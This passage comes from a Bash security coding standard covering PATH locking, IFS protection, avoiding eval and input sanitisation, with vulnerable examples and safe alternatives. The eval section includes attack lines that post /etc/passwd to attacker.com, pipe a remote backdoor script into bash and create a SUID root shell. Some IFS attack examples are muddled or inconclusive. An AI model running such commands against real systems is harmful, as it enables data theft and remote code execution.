set -euo pipefail

# Start with secure base PATH
readonly BASE_PATH='/usr/local/bin:/usr/bin:/bin'

# Add application-specific paths
readonly APP_PATH='/opt/myapp/bin'

# Combine with secure base first
export PATH="$BASE_PATH:$APP_PATH"
readonly PATH

# Validate application path exists and is not world-writable
[[ -d "$APP_PATH" ]] || die 1 "Application path does not exist: $APP_PATH"
[[ -w "$APP_PATH" ]] && die 1 "Application path is writable: $APP_PATH"

# Use commands from combined PATH
myapp-command --option
\`\`\`

**Special consideration: Sudo and PATH:**

\`\`\`bash
# When using sudo, PATH is reset by default
# /etc/sudoers typically includes:
# Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# ✓ This is safe - sudo uses secure_path
sudo /usr/local/bin/backup.sh

# ✗ This preserves user's PATH (dangerous if env_keep includes PATH)
# Don't configure sudoers with: Defaults env_keep += "PATH"

# ✓ Correct - script sets its own PATH regardless
sudo /usr/local/bin/backup.sh
# Even if sudo preserves PATH, script overwrites it:
#   readonly PATH='/usr/local/bin:/usr/bin:/bin'
\`\`\`

**Checking PATH from within script:**

\`\`\`bash
# Debug: Show PATH being used
debug() {
  >&2 echo "DEBUG: Current PATH=$PATH"
  >&2 echo "DEBUG: which tar=$(command -v tar)"
  >&2 echo "DEBUG: which rm=$(command -v rm)"
}

((DEBUG)) && debug

# Verify PATH doesn't contain dangerous elements
check_path_security() {
  local -a issues=()

  [[ "$PATH" =~ \\.  ]] && issues+=('contains current directory (.)')
  [[ "$PATH" =~ ^:  ]] && issues+=('starts with empty element')
  [[ "$PATH" =~ ::  ]] && issues+=('contains empty element (::)')
  [[ "$PATH" =~ :$  ]] && issues+=('ends with empty element')
  [[ "$PATH" =~ /tmp ]] && issues+=('contains /tmp')

  if ((${#issues[@]} > 0)); then
    error 'PATH security issues detected:'
    local issue
    for issue in "${issues[@]}"; do
      error "  - $issue"
    done
    return 1
  fi

  info 'PATH security check passed'
  return 0
}

check_path_security || die 1 'PATH security validation failed'
\`\`\`

**System-wide PATH security:**

\`\`\`bash
# Check system default PATH in /etc/environment
cat /etc/environment
# Should be: PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# Check for world-writable directories in system PATH
IFS=':' read -ra path_dirs <<< "$PATH"
for dir in "${path_dirs[@]}"; do
  if [[ -d "$dir" && -w "$dir" ]]; then
    warn "World-writable directory in PATH: $dir"
  fi
done

# Find world-writable directories in PATH
find $(echo "$PATH" | tr ':' ' ') -maxdepth 0 -type d -writable 2>/dev/null
\`\`\`

**Real-world example: Distribution installer script:**

\`\`\`bash
#!/bin/bash
# Secure installer script for system-wide deployment
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Lock down PATH immediately - critical for security
readonly PATH='/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin'
export PATH

VERSION='1.0.0'
SCRIPT_NAME=$(basename "$0")

# Script metadata
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Verify we're using expected command locations
command -v tar | grep -q '^/bin/tar$' || \
  die 1 'Security: tar command not from /bin/tar'

# Rest of secure installation logic
\`\`\`

**Summary:**

- **Always set PATH** explicitly at the start of security-critical scripts
- **Use `readonly PATH`** to prevent later modification
- **Never include** `.` (current directory), empty elements, `/tmp`, or user directories
- **Validate PATH** if you must use inherited environment
- **Use absolute paths** for critical commands as defense in depth
- **Place PATH setting early** - first few lines after `set -euo pipefail`
- **Check permissions** on directories in PATH (none should be world-writable)
- **Test PATH security** as part of your script testing process

**Key principle:** PATH is trusted implicitly by command execution. An attacker who controls your PATH controls which code runs. Always secure it first.


---


**Rule: BCS1203**

### IFS Manipulation Safety

**Never trust or use inherited IFS values. Always protect IFS changes to prevent field splitting attacks and unexpected behavior.**

**Rationale:**

- **Security Vulnerability**: Attackers can manipulate IFS in the calling environment to exploit scripts that don't protect IFS
- **Field Splitting Exploits**: Malicious IFS values cause word splitting at unexpected characters, breaking argument parsing
- **Command Injection**: IFS manipulation combined with unquoted variables enables command execution
- **Global Side Effects**: Changing IFS without restoration breaks subsequent operations throughout the script
- **Environment Inheritance**: IFS is inherited from parent processes and may be attacker-controlled
- **Subtle Bugs**: IFS changes cause hard-to-debug issues when forgotten or improperly scoped

**Understanding IFS:**

IFS (Internal Field Separator) controls how Bash splits words during expansion. Default is `$' \t\n'` (space, tab, newline).

\`\`\`bash
# Default IFS behavior
IFS=$' \t\n'  # Space, tab, newline (default)
data="one two three"
read -ra words <<< "$data"
# Result: words=("one" "two" "three")

# Custom IFS for CSV parsing
IFS=','
data="apple,banana,orange"
read -ra fruits <<< "$data"
# Result: fruits=("apple" "banana" "orange")
\`\`\`

**Attack Example 1: Field Splitting Exploitation**

\`\`\`bash
# Vulnerable script - doesn't protect IFS
#!/bin/bash
set -euo pipefail

# Script expects space-separated list
process_files() {
  local -- file_list="$1"
  local -a files

  # Vulnerable: IFS could be manipulated
  read -ra files <<< "$file_list"

  for file in "${files[@]}"; do
    rm -- "$file"  # Deletes each file
  done
}

# Normal usage
process_files "temp1.txt temp2.txt temp3.txt"
# Deletes: temp1.txt, temp2.txt, temp3.txt
\`\`\`

**Attack:**
\`\`\`bash
# Attacker sets IFS to slash
export IFS='/'
./vulnerable-script.sh

# Inside the script, file_list="temp1.txt temp2.txt"
# With IFS='/', read -ra splits on '/' not spaces!
# files=("temp1.txt temp2.txt")  # NOT split - treated as one filename!

# Or worse - attacker uses this to bypass filtering:
export IFS=$'\n'
./vulnerable-script.sh "/etc/passwd
/root/.ssh/authorized_keys"
# Now the script processes these filenames as if they were in the list
\`\`\`

**Attack Example 2: Command Injection via IFS**

\`\`\`bash
# Vulnerable script
#!/bin/bash
set -euo pipefail

# Process user-provided command with arguments
user_input="$1"
# Split on spaces to get command and arguments
read -ra cmd_parts <<< "$user_input"

# Execute command
"${cmd_parts[@]}"
\`\`\`

**Attack:**
\`\`\`bash
# Attacker manipulates IFS before calling script
export IFS='X'
./vulnerable-script.sh "lsX-laX/etc/shadow"

# With IFS='X', the splitting becomes:
# cmd_parts=("ls" "-la" "/etc/shadow")
# Script executes: ls -la /etc/shadow
# Attacker bypassed any input validation that checked for spaces!
\`\`\`

**Attack Example 3: Privilege Escalation via SUID Script**

\`\`\`bash
# Vulnerable SUID script (should never exist, but illustrative)
#!/bin/bash
# /usr/local/bin/backup.sh (SUID root - NEVER DO THIS!)

# Supposed to back up only allowed directories
allowed_dirs="home var opt"

# Check if user-provided directory is allowed
user_dir="$1"
is_allowed=0

for dir in $allowed_dirs; do  # Unquoted expansion uses IFS!
  [[ "$user_dir" == "$dir" ]] && is_allowed=1
done

((is_allowed)) || die 5 "Directory not allowed: $user_dir"

# Back up the directory with root privileges
tar -czf "/backup/${user_dir}.tar.gz" "/$user_dir"
\`\`\`

**Attack:**
\`\`\`bash
# Attacker sets IFS to 'e'
export IFS='e'
/usr/local/bin/backup.sh "etc"

# The loop splits "home var opt" on 'e':
# Results in words: "hom" " var opt"
# None match "etc", but if validation was bypassed differently...

# More direct attack - set IFS to include the target:
export IFS=' e'
# Now "home" splits to "hom " "
# The attacker can craft IFS to make "etc" appear in the allowed list
\`\`\`

**Safe Pattern 1: Save and Restore IFS (Explicit)**

\`\`\`bash
# ✓ Correct - save, modify, restore
parse_csv() {
  local -- csv_data="$1"
  local -a fields
  local -- saved_ifs

  # Save current IFS
  saved_ifs="$IFS"

  # Set IFS for CSV parsing
  IFS=','
  read -ra fields <<< "$csv_data"

  # Restore IFS immediately
  IFS="$saved_ifs"

  # Process fields with original IFS restored
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}
\`\`\`

**Safe Pattern 2: Subshell Isolation (Preferred)**

\`\`\`bash
# ✓ Correct - IFS change isolated to subshell
parse_csv() {
  local -- csv_data="$1"
  local -a fields

  # Use subshell - IFS change automatically reverts when subshell exits
  fields=( $(
    IFS=','
    read -ra temp <<< "$csv_data"
    printf '%s\n' "${temp[@]}"
  ) )

  # Or simpler - capture in subshell directly
  IFS=',' read -ra fields <<< "$csv_data"  # This also works in some contexts

  # Process with original IFS intact
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}
\`\`\`

**Safe Pattern 3: Local IFS in Function**

\`\`\`bash
# ✓ Correct - use local to scope IFS change
parse_csv() {
  local -- csv_data="$1"
  local -a fields
  local -- IFS  # Make IFS local to this function

  # Now changes to IFS only affect this function
  IFS=','
  read -ra fields <<< "$csv_data"

  # IFS automatically restored when function returns
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}

# After function returns, IFS is unchanged in caller
\`\`\`

**Safe Pattern 4: One-Line IFS Assignment**

\`\`\`bash
# ✓ Correct - IFS change applies only to single command
# This is a bash feature: VAR=value command applies VAR only to that command

# Parse CSV in one line
IFS=',' read -ra fields <<< "$csv_data"
# IFS is automatically reset after the read command

# Parse colon-separated PATH
IFS=':' read -ra path_dirs <<< "$PATH"
# IFS is automatically reset after the read command

# This is the most concise and safe pattern for single operations
\`\`\`

**Safe Pattern 5: Explicitly Set IFS at Script Start**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Explicitly set IFS to known-safe value at script start
# This defends against inherited malicious IFS
IFS=$' \t\n'  # Space, tab, newline (standard default)
readonly IFS  # Prevent modification
export IFS

# Rest of script operates with trusted IFS
# Any attempt to modify IFS will fail due to readonly
\`\`\`

**Edge case: IFS with read -d (delimiter)**

\`\`\`bash
# When using read -d, IFS still matters for field splitting
# The delimiter (-d) determines where to stop reading
# IFS determines how to split what was read

# Reading null-delimited input (common with find -print0)
while IFS= read -r -d '' file; do
  # IFS= prevents field splitting
  # -d '' sets null byte as delimiter
  process "$file"
done < <(find . -type f -print0)

# This is the safe pattern for filenames with spaces
\`\`\`

**Edge case: IFS and globbing**

\`\`\`bash
# IFS affects word splitting, NOT pathname expansion (globbing)
IFS=':'
files=*.txt  # Glob expands normally

# But IFS affects how results are split if unquoted
echo $files  # Splits on ':' - WRONG!

# Always quote to prevent IFS-based splitting
echo "$files"  # Safe - no splitting
\`\`\`

**Edge case: Empty IFS**

\`\`\`bash
# Setting IFS='' (empty) disables field splitting entirely
IFS=''
data="one two three"
read -ra words <<< "$data"
# Result: words=("one two three")  # NOT split!

# This can be useful to preserve exact input
IFS= read -r line < file.txt  # Preserves leading/trailing whitespace
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - modifying IFS without save/restore
IFS=','
read -ra fields <<< "$csv_data"
# IFS is now ',' for the rest of the script - BROKEN!

# ✓ Correct - save and restore
saved_ifs="$IFS"
IFS=','
read -ra fields <<< "$csv_data"
IFS="$saved_ifs"

# ✗ Wrong - trusting inherited IFS
#!/bin/bash
set -euo pipefail
# No IFS protection - vulnerable to manipulation!
read -ra parts <<< "$user_input"

# ✓ Correct - set IFS explicitly
#!/bin/bash
set -euo pipefail
IFS=$' \t\n'  # Set to known-safe value
readonly IFS
read -ra parts <<< "$user_input"

# ✗ Wrong - forgetting to restore IFS in error cases
saved_ifs="$IFS"
IFS=','
some_command || return 1  # IFS not restored on error!
IFS="$saved_ifs"

# ✓ Correct - use trap or subshell
(
  IFS=','
  some_command || return 1  # Subshell ensures IFS is restored
)

# ✗ Wrong - modifying IFS globally
IFS=$'\n'  # Changed for entire script
for line in $(cat file.txt); do
  process "$line"
done
# Now ALL subsequent operations use wrong IFS!

# ✓ Correct - isolate IFS change
while IFS= read -r line; do
  process "$line"
done < file.txt

# ✗ Wrong - using IFS for complex parsing
IFS=':' read -r user pass uid gid name home shell <<< "$passwd_line"
# Fragile - breaks if any field contains ':'

# ✓ Correct - use cut or awk for structured data
user=$(cut -d: -f1 <<< "$passwd_line")
uid=$(cut -d: -f3 <<< "$passwd_line")
\`\`\`

**Complete safe example:**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Set IFS to known-safe value immediately
IFS=$' \t\n'
readonly IFS
export IFS

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Parse CSV data safely
parse_csv_file() {
  local -- csv_file="$1"
  local -a records

  # Read file line by line
  while IFS= read -r line; do
    # Parse CSV fields using subshell-isolated IFS
    local -a fields
    (
      IFS=','
      read -ra fields <<< "$line"

      # Process fields
      info "Name: ${fields[0]}"
      info "Email: ${fields[1]}"
      info "Age: ${fields[2]}"
    )
  done < "$csv_file"
}

# Alternative: One-line IFS for each read
parse_csv_line() {
  local -- csv_line="$1"
  local -a fields

  # IFS applies only to this read command
  IFS=',' read -ra fields <<< "$csv_line"

  # Process with normal IFS
  for field in "${fields[@]}"; do
    info "Field: $field"
  done
}

main() {
  parse_csv_file 'data.csv'
}

main "$@"

#fin
\`\`\`

**Testing IFS safety:**

\`\`\`bash
# Test script behavior with malicious IFS
test_ifs_safety() {
  # Save original IFS
  local -- original_ifs="$IFS"

  # Set malicious IFS
  IFS='/'

  # Run function that should be IFS-safe
  parse_csv_line "apple,banana,orange"

  # Verify IFS was restored
  if [[ "$IFS" == "$original_ifs" ]]; then
    success 'IFS properly protected'
  else
    error 'IFS leaked - security vulnerability!'
    return 1
  fi
}
\`\`\`

**Checking current IFS:**

\`\`\`bash
# Display current IFS (non-printable characters shown)
debug() {
  local -- ifs_visual
  ifs_visual=$(printf '%s' "$IFS" | cat -v)
  >&2 echo "DEBUG: Current IFS: [$ifs_visual]"
  >&2 echo "DEBUG: IFS length: ${#IFS}"
  >&2 printf 'DEBUG: IFS bytes: %s\n' "$(printf '%s' "$IFS" | od -An -tx1)"
}

# Verify IFS is default
verify_default_ifs() {
  local -- expected=$' \t\n'
  if [[ "$IFS" == "$expected" ]]; then
    info 'IFS is default (safe)'
  else
    warn 'IFS is non-standard'
    debug
  fi
}
\`\`\`

**Summary:**

- **Set IFS explicitly** at script start: `IFS=$' \t\n'; readonly IFS`
- **Use subshells** to isolate IFS changes: `( IFS=','; read -ra fields <<< "$data" )`
- **Use one-line assignment** for single commands: `IFS=',' read -ra fields <<< "$data"`
- **Use local IFS** in functions to scope changes: `local -- IFS; IFS=','`
- **Always restore IFS** if modifying: `saved_ifs="$IFS"; IFS=','; ...; IFS="$saved_ifs"`
- **Never trust inherited IFS** - always set it yourself
- **Test IFS safety** as part of security validation

**Key principle:** IFS is a global variable that affects word splitting throughout your script. Treat it as security-critical and always protect changes with proper scoping or save/restore patterns.


---


**Rule: BCS1204**

### Eval Command

**Never use `eval` with untrusted input. Avoid `eval` entirely unless absolutely necessary, and even then, seek alternatives first.**

**Rationale:**

- **Code Injection**: `eval` executes arbitrary code, allowing complete system compromise if input is attacker-controlled
- **No Sandboxing**: `eval` runs with full script privileges, including file access, network operations, and command execution
- **Bypasses All Validation**: Even sanitized input can contain metacharacters that enable injection
- **Difficult to Audit**: Dynamic code construction makes security review nearly impossible
- **Error Prone**: Quoting and escaping requirements are complex and frequently implemented incorrectly
- **Better Alternatives Exist**: Almost every use case has a safer alternative using arrays, indirect expansion, or proper data structures

**Understanding eval:**

`eval` takes a string, performs all expansions on it, then executes the result as a command.

\`\`\`bash
# Basic eval behavior
cmd='echo "Hello World"'
eval "$cmd"  # Executes: echo "Hello World"
# Output: Hello World

# The danger: eval performs expansion TWICE
var='$(whoami)'
eval "echo $var"  # First expansion: echo $(whoami)
                   # Second expansion: executes whoami command!
# Output: username
\`\`\`

**Attack Example 1: Direct Command Injection**

\`\`\`bash
# Vulnerable script - NEVER DO THIS!
#!/bin/bash
set -euo pipefail

# Script allows user to set a variable
user_input="$1"

# Dangerous: eval executes arbitrary code
eval "$user_input"
\`\`\`

**Attack:**
\`\`\`bash
# Attacker provides malicious input
./vulnerable-script.sh 'rm -rf /tmp/*'
# Executes: rm -rf /tmp/*

# Or worse - exfiltrate data
./vulnerable-script.sh 'curl -X POST -d @/etc/passwd https://attacker.com/collect'

# Or install backdoor
./vulnerable-script.sh 'curl https://attacker.com/backdoor.sh | bash'

# Or create SUID shell
./vulnerable-script.sh 'cp /bin/bash /tmp/rootshell; chmod u+s /tmp/rootshell'
\`\`\`

**Attack Example 2: Variable Name Injection**

\`\`\`bash
# Vulnerable script - seems safe but isn't!
#!/bin/bash
set -euo pipefail

# User provides variable name and value
var_name="$1"
var_value="$2"

# Attempt to set variable dynamically - DANGEROUS!
eval "$var_name='$var_value'"

echo "Variable $var_name has been set"
\`\`\`

**Attack:**
\`\`\`bash
# Attacker injects command via variable name
./vulnerable-script.sh 'x=$(rm -rf /important/data)' 'ignored'

# The eval executes:
# x=$(rm -rf /important/data)='ignored'
# Which executes the command substitution!

# Or exfiltrate via variable value
./vulnerable-script.sh 'x' '$(cat /etc/shadow > /tmp/stolen)'
# The eval executes:
# x='$(cat /etc/shadow > /tmp/stolen)'
# Command substitution runs with script privileges!
\`\`\`

**Attack Example 3: Escaped Character Bypass**

\`\`\`bash
# Vulnerable script - attempts sanitization
#!/bin/bash
set -euo pipefail

# User input for calculation
user_expr="$1"

# Attempt to sanitize - INSUFFICIENT!
sanitized="${user_expr//[^0-9+\\-*\\/]/}"  # Allow only digits and operators

# Still dangerous!
eval "result=$sanitized"
echo "Result: $result"
\`\`\`

**Attack:**
\`\`\`bash
# Attacker uses allowed characters maliciously
./vulnerable-script.sh '1+1)); curl https://attacker.com/steal?data=$(cat /etc/passwd); echo $((1'

# Or uses integer assignment to overwrite critical variables
./vulnerable-script.sh 'PATH=0'
# Now PATH is set to 0, breaking the script or enabling other attacks
\`\`\`

**Attack Example 4: Log Injection via eval**

\`\`\`bash
# Vulnerable logging function
log_event() {
  local -- event="$1"
  local -- timestamp
  timestamp=$(date '+%Y-%m-%d %H:%M:%S')

  # Dangerous: eval used to expand variables in log template
  local -- log_template='echo "$timestamp - Event: $event" >> /var/log/app.log'
  eval "$log_template"
}

# Usage
user_action="$1"
log_event "$user_action"
\`\`\`

**Attack:**
\`\`\`bash
# Attacker injects command via event parameter
./vulnerable-script.sh 'login"; cat /etc/shadow > /tmp/pwned; echo "'

# The eval executes:
# echo "2025-01-15 10:30:00 - Event: login"; cat /etc/shadow > /tmp/pwned; echo "" >> /var/log/app.log
# Three commands execute: echo, cat (malicious), echo
\`\`\`

**Safe Alternative 1: Use Arrays for Command Construction**

\`\`\`bash
# ✓ Correct - build command safely with array
build_find_command() {
  local -- search_path="$1"
  local -- file_pattern="$2"
  local -a cmd

  # Build command in array - no eval needed!
  cmd=(find "$search_path" -type f -name "$file_pattern")

  # Execute array safely
  "${cmd[@]}"
}

# Usage
build_find_command '/var/data' '*.txt'

# Array preserves exact arguments, no injection possible
\`\`\`

**Safe Alternative 2: Use Indirect Expansion for Variable References**

\`\`\`bash
# ✗ Wrong - using eval for variable indirection
var_name='HOME'
eval "value=\\$$var_name"  # Gets value of $HOME
echo "$value"

# ✓ Correct - use indirect expansion
var_name='HOME'
echo "${!var_name}"  # Direct syntax, no eval needed

# ✓ Correct - for assignment, use declare/printf
var_name='MY_VAR'
value='Hello World'
printf -v "$var_name" '%s' "$value"  # Assigns to MY_VAR safely
echo "${!var_name}"  # Access value
\`\`\`

**Safe Alternative 3: Use Associative Arrays for Dynamic Data**

\`\`\`bash
# ✗ Wrong - using eval to create dynamic variables
for i in {1..5}; do
  eval "var_$i='value $i'"  # Creates var_1, var_2, etc.
done

# ✓ Correct - use associative array
declare -A data
for i in {1..5}; do
  data["var_$i"]="value $i"
done

# Access values
echo "${data[var_3]}"  # value 3
\`\`\`

**Safe Alternative 4: Use Functions Instead of Dynamic Code**

\`\`\`bash
# ✗ Wrong - eval to select function dynamically
action="$1"
eval "${action}_function"  # If action='malicious', dangerous!

# ✓ Correct - use case statement
case "$action" in
  start)   start_function ;;
  stop)    stop_function ;;
  restart) restart_function ;;
  status)  status_function ;;
  *)       die 22 "Invalid action: $action" ;;
esac

# ✓ Also correct - use array of function names
declare -A actions=(
  [start]=start_function
  [stop]=stop_function
  [restart]=restart_function
  [status]=status_function
)

if [[ -v "actions[$action]" ]]; then
  "${actions[$action]}"
else
  die 22 "Invalid action: $action"
fi
\`\`\`

**Safe Alternative 5: Use Command Substitution for Output Capture**

\`\`\`bash
# ✗ Wrong - eval for command output
cmd='ls -la /tmp'
eval "output=\$($cmd)"  # Dangerous!

# ✓ Correct - direct command substitution
output=$(ls -la /tmp)

# ✓ Correct - if command is in variable, use array
declare -a cmd=(ls -la /tmp)
output=$("${cmd[@]}")
\`\`\`

**Safe Alternative 6: Use read for Parsing**

\`\`\`bash
# ✗ Wrong - eval for parsing key=value pairs
config_line="PORT=8080"
eval "$config_line"  # Sets PORT variable - DANGEROUS!

# ✓ Correct - use read or parameter expansion
IFS='=' read -r key value <<< "$config_line"
declare -g "$key=$value"  # Still be careful with key validation!

# ✓ Better - validate key before assignment
if [[ "$key" =~ ^[A-Z_][A-Z0-9_]*$ ]]; then
  declare -g "$key=$value"
else
  die 22 "Invalid configuration key: $key"
fi
\`\`\`

**Safe Alternative 7: Use Arithmetic Expansion for Math**

\`\`\`bash
# ✗ Wrong - eval for arithmetic
user_expr="$1"
eval "result=$((user_expr))"  # Still risky!

# ✓ Correct - validate first, then use arithmetic
if [[ "$user_expr" =~ ^[0-9+\\-*/\\ ()]+$ ]]; then
  result=$((user_expr))
else
  die 22 "Invalid arithmetic expression: $user_expr"
fi

# ✓ Better - use bc for complex math (isolates operations)
result=$(bc <<< "$user_expr")
\`\`\`

**Edge case: When eval seems necessary**

**Scenario: Dynamic variable names in loops**

\`\`\`bash
# Seems to need eval
for service in nginx apache mysql; do
  eval "${service}_status=\$(systemctl is-active $service)"
done

# ✓ Better - use associative array
declare -A service_status
for service in nginx apache mysql; do
  service_status["$service"]=$(systemctl is-active "$service")
done
\`\`\`

**Scenario: Sourcing configuration with variable expansion**

\`\`\`bash
# Config file contains: APP_DIR="$HOME/myapp"
# Simple sourcing doesn't expand $HOME

# Seems to need eval
while IFS= read -r line; do
  eval "$line"
done < config.txt

# ✓ Better - source directly (bash expands variables)
source config.txt

# ✓ Even better - validate config file first
if [[ -f config.txt && -r config.txt ]]; then
  # Check for dangerous patterns
  if grep -qE '(eval|exec|`|\$\()' config.txt; then
    die 1 'Config file contains dangerous patterns'
  fi
  source config.txt
else
  die 2 'Config file not found or not readable'
fi
\`\`\`

**Scenario: Building complex command with many options**

\`\`\`bash
# Seems to need eval to build command string
cmd="find /data -type f"
[[ -n "$name_pattern" ]] && cmd="$cmd -name '$name_pattern'"
[[ -n "$size" ]] && cmd="$cmd -size '$size'"
eval "$cmd"  # DANGEROUS!

# ✓ Correct - use array
declare -a cmd=(find /data -type f)
[[ -n "$name_pattern" ]] && cmd+=(-name "$name_pattern")
[[ -n "$size" ]] && cmd+=(-size "$size")
"${cmd[@]}"  # Safe execution
\`\`\`

**The rare legitimate use of eval (with extreme caution):**

\`\`\`bash
# Parsing output with known-safe format from trusted source
# Example: getconf outputs shell variable assignments
eval "$(getconf ARG_MAX)"  # Sets ARG_MAX variable

# Still better to parse manually:
ARG_MAX=$(getconf ARG_MAX)

# Another rare case: generating code from templates (development/build only)
# NEVER in production with user input!
\`\`\`

**Anti-patterns to avoid:**

\`\`\`bash
# ✗ Wrong - eval with any user input
eval "$user_command"

# ✓ Correct - validate against whitelist
case "$user_command" in
  start|stop|restart|status) systemctl "$user_command" myapp ;;
  *) die 22 "Invalid command: $user_command" ;;
esac

# ✗ Wrong - eval for variable assignment
eval "$var_name='$var_value'"

# ✓ Correct - use printf -v
printf -v "$var_name" '%s' "$var_value"

# ✗ Wrong - eval to source file with expansion
eval "source $config_file"

# ✓ Correct - source directly or use safe expansion
source "$config_file"

# ✗ Wrong - eval in loop
for file in *.txt; do
  eval "process_${file%.txt}"  # Trying to call function dynamically
done

# ✓ Correct - use array lookup or case statement
declare -A processors=(
  [data]=process_data
  [log]=process_log
)
for file in *.txt; do
  base="${file%.txt}"
  if [[ -v "processors[$base]" ]]; then
    "${processors[$base]}"
  fi
done

# ✗ Wrong - eval to check if variable is set
eval "if [[ -n \\$$var_name ]]; then echo set; fi"

# ✓ Correct - use -v test
if [[ -v "$var_name" ]]; then
  echo set
fi

# ✗ Wrong - double expansion with eval
eval "echo \$$var_name"

# ✓ Correct - indirect expansion
echo "${!var_name}"
\`\`\`

**Complete safe example (no eval):**

\`\`\`bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# Configuration using associative array (no eval)
declare -A config=(
  [app_name]='myapp'
  [app_port]='8080'
  [app_host]='localhost'
)

# Dynamic function dispatch (no eval)
declare -A actions=(
  [start]=start_service
  [stop]=stop_service
  [restart]=restart_service
  [status]=status_service
)

start_service() {
  info "Starting ${config[app_name]} on ${config[app_host]}:${config[app_port]}"
  # Start logic here
}

stop_service() {
  info "Stopping ${config[app_name]}"
  # Stop logic here
}

restart_service() {
  stop_service
  start_service
}

status_service() {
  # Check status logic here
  info "${config[app_name]} is running"
}

# Build command dynamically with array (no eval)
build_curl_command() {
  local -- url="$1"
  local -a curl_cmd=(curl)

  # Add options based on configuration
  [[ -v config[proxy] ]] && curl_cmd+=(--proxy "${config[proxy]}")
  [[ -v config[timeout] ]] && curl_cmd+=(--timeout "${config[timeout]}")

  # Add URL
  curl_cmd+=("$url")

  # Execute safely
  "${curl_cmd[@]}"
}

main() {
  local -- action="${1:-status}"

  # Dispatch to function (no eval)
  if [[ -v "actions[$action]" ]]; then
    "${actions[$action]}"
  else
    die 22 "Invalid action: $action. Valid: ${!actions[*]}"
  fi
}

main "$@"

#fin
\`\`\`

**Detecting eval usage:**

\`\`\`bash
# Find all eval usage in scripts
grep -rn 'eval' /path/to/scripts/

# Check if eval is used with variables (very dangerous)
grep -rn 'eval.*\$' /path/to/scripts/

# ShellCheck will warn about eval
shellcheck -x script.sh
# SC2086: eval should not be used for variable expansion
\`\`\`

**Testing for eval vulnerabilities:**

\`\`\`bash
# Test script with malicious input
test_eval_safety() {
  local -- malicious_input='$(rm -rf /tmp/test_eval_*)'

  # Create test directory
  mkdir -p /tmp/test_eval_target
  touch /tmp/test_eval_target/testfile

  # Run function with malicious input
  process_input "$malicious_input"

  # Check if malicious command executed
  if [[ ! -d /tmp/test_eval_target ]]; then
    error 'SECURITY VULNERABILITY: eval executed malicious code!'
    return 1
  else
    success 'Input properly sanitized - no eval execution'
    return 0
  fi

  # Cleanup
  rm -rf /tmp/test_eval_target
}
\`\`\`

**Summary:**

- **Never use eval with untrusted input** - no exceptions
- **Avoid eval entirely** - better alternatives exist for almost all use cases
- **Use arrays** for dynamic command construction: `cmd=(find); cmd+=(-name "*.txt"); "${cmd[@]}"`
- **Use indirect expansion** for variable references: `echo "${!var_name}"`
- **Use associative arrays** for dynamic data: `declare -A data; data[$key]=$value`
- **Use case/arrays** for function dispatch instead of eval
- **Validate strictly** if eval is absolutely unavoidable (which it almost never is)
- **Audit regularly** for eval usage in codebases
- **Enable ShellCheck** to catch eval misuse

**Key principle:** If you think you need `eval`, you're solving the wrong problem. There is almost always a safer alternative using proper Bash features like arrays, indirect expansion, or associative arrays.


---


**Rule: BCS1205**

### Input Sanitization

**Always validate and sanitize user input to prevent security issues.**

**Rationale:**
- **Prevent injection attacks**: User input could contain malicious code
- **Prevent directory traversal**: `../../../etc/passwd` type attacks
- **Validate data types**: Ensure input matches expected format
- **Fail early**: Reject invalid input before processing
- **Defense in depth**: Never trust user input

**1. Filename validation:**

\`\`\`bash
# Validate filename - no directory traversal, no special chars
sanitize_filename() {
  local -- name="$1"

  # Reject empty input
  [[ -n "$name" ]] || die 22 'Filename cannot be empty'

  # Remove directory traversal attempts
  name="${name//\.\./}"  # Remove all ..
  name="${name//\//}"    # Remove all /

  # Allow only safe characters: alphanumeric, dot, underscore, hyphen
  if [[ ! "$name" =~ ^[a-zA-Z0-9._-]+$ ]]; then
    die 22 "Invalid filename '$name': contains unsafe characters"
  fi

  # Reject hidden files (starting with .)
  [[ "$name" =~ ^\\. ]] && die 22 "Filename cannot start with dot: $name"

  # Reject names that are too long
  ((${#name} > 255)) && die 22 "Filename too long (max 255 chars): $name"

  echo "$name"
}

# Usage
user_filename=$(sanitize_filename "$user_input")
safe_path="$SAFE_DIR/$user_filename"
\`\`\`

**2. Numeric input validation:**

\`\`\`bash
# Validate integer (positive or negative)
validate_integer() {
  local -- input="$1"
  [[ -n "$input" ]] || die 22 'Number cannot be empty'

  if [[ ! "$input" =~ ^-?[0-9]+$ ]]; then
    die 22 "Invalid integer: '$input'"
  fi
  echo "$input"
}

# Validate positive integer
validate_positive_integer() {
  local -- input="$1"
  [[ -n "$input" ]] || die 22 'Number cannot be empty'

  if [[ ! "$input" =~ ^[0-9]+$ ]]; then
    die 22 "Invalid positive integer: '$input'"
  fi

  # Check for leading zeros (often indicates octal interpretation)
  [[ "$input" =~ ^0[0-9] ]] && die 22 "Number cannot have leading zeros: $input"

  echo "$input"
}

# Validate with range check
validate_port() {
  local -- port="$1"
  port=$(validate_positive_integer "$port")

  ((port >= 1 && port <= 65535)) || die 22 "Port must be 1-65535: $port"
  echo "$port"
}
\`\`\`

**3. Path validation:**

\`\`\`bash
# Validate path is within allowed directory
validate_path() {
  local -- input_path="$1"
  local -- allowed_dir="$2"

